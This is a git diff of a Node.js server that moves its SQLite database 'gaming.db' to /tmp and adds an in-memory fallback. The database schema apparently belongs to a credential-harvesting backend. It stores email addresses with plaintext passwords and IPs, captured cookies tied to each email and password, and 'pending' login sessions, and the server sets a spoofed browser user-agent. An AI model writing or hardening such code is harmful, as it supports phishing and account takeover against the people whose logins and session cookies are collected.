@@ -27,48 +27,94 @@ app.use((req, res, next) => {
 });
 
 // SQLite Database initialization
-const dbPath = path.join(__dirname, 'gaming.db');
-const db = new Database(dbPath);
+// Use a writable location - on cloud platforms, try /tmp first, then fallback to current directory
+let dbPath;
+try {
+    // Try /tmp first (common writable location on Linux/cloud platforms)
+    const fs = require('fs');
+    const tmpDir = '/tmp';
+    if (fs.existsSync(tmpDir) && fs.statSync(tmpDir).isDirectory()) {
+        // Check if we can write to /tmp
+        try {
+            const testFile = path.join(tmpDir, '.write-test');
+            fs.writeFileSync(testFile, 'test');
+            fs.unlinkSync(testFile);
+            dbPath = path.join(tmpDir, 'gaming.db');
+            console.log('Using /tmp directory for database');
+        } catch (e) {
+            // Can't write to /tmp, use current directory
+            dbPath = path.join(__dirname, 'gaming.db');
+            console.log('Using current directory for database');
+        }
+    } else {
+        dbPath = path.join(__dirname, 'gaming.db');
+        console.log('Using current directory for database');
+    }
+} catch (e) {
+    // Fallback to current directory
+    dbPath = path.join(__dirname, 'gaming.db');
+    console.log('Using current directory for database (fallback)');
+}
 
-// Create tables if they don't exist
-db.exec(`
-    CREATE TABLE IF NOT EXISTS results (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        email TEXT NOT NULL,
-        password TEXT NOT NULL,
-        ip TEXT NOT NULL UNIQUE,
-        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
-        updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
-    );
-    
-    CREATE TABLE IF NOT EXISTS cookies (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        email TEXT NOT NULL UNIQUE,
-        password TEXT NOT NULL,
-        cookies TEXT NOT NULL,
-        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
-        updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
-    );
-    
-    CREATE TABLE IF NOT EXISTS sessions (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        session_id TEXT NOT NULL UNIQUE,
-        email TEXT NOT NULL,
-        password TEXT NOT NULL,
-        ip TEXT NOT NULL,
-        status TEXT NOT NULL DEFAULT 'pending',
-        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
-        updated_at DATETIME DEFAULT CURRENT_TIMESTAMP,
-        expires_at DATETIME NOT NULL
-    );
-    
-    CREATE INDEX IF NOT EXISTS idx_results_ip ON results(ip);
-    CREATE INDEX IF NOT EXISTS idx_cookies_email ON cookies(email);
-    CREATE INDEX IF NOT EXISTS idx_sessions_session_id ON sessions(session_id);
-    CREATE INDEX IF NOT EXISTS idx_sessions_expires_at ON sessions(expires_at);
-`);
+let db;
+try {
+    db = new Database(dbPath);
+    console.log('✅ SQLite database initialized at:', dbPath);
+} catch (error) {
+    console.error('❌ Failed to initialize SQLite database:', error.message);
+    console.log('⚠️ Using in-memory storage as fallback');
+    // Set db to null - we'll use in-memory storage
+    db = null;
+}
 
-console.log('✅ SQLite database initialized at:', dbPath);
+// Create tables if they don't exist (only if database is initialized)
+if (db) {
+    try {
+        db.exec(`
+            CREATE TABLE IF NOT EXISTS results (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                email TEXT NOT NULL,
+                password TEXT NOT NULL,
+                ip TEXT NOT NULL UNIQUE,
+                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+                updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
+            );
+            
+            CREATE TABLE IF NOT EXISTS cookies (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                email TEXT NOT NULL UNIQUE,
+                password TEXT NOT NULL,
+                cookies TEXT NOT NULL,
+                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+                updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
+            );
+            
+            CREATE TABLE IF NOT EXISTS sessions (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                session_id TEXT NOT NULL UNIQUE,
+                email TEXT NOT NULL,
+                password TEXT NOT NULL,
+                ip TEXT NOT NULL,
+                status TEXT NOT NULL DEFAULT 'pending',
+                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+                updated_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+                expires_at DATETIME NOT NULL
+            );
+            
+            CREATE INDEX IF NOT EXISTS idx_results_ip ON results(ip);
+            CREATE INDEX IF NOT EXISTS idx_cookies_email ON cookies(email);
+            CREATE INDEX IF NOT EXISTS idx_sessions_session_id ON sessions(session_id);
+            CREATE INDEX IF NOT EXISTS idx_sessions_expires_at ON sessions(expires_at);
+        `);
+        console.log('✅ Database tables created successfully');
+    } catch (error) {
+        console.error('❌ Failed to create database tables:', error.message);
+        console.log('⚠️ Using in-memory storage as fallback');
+        db = null;
+    }
+} else {
+    console.log('⚠️ Database not available - using in-memory storage only');
+}
 
 const ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36';
 
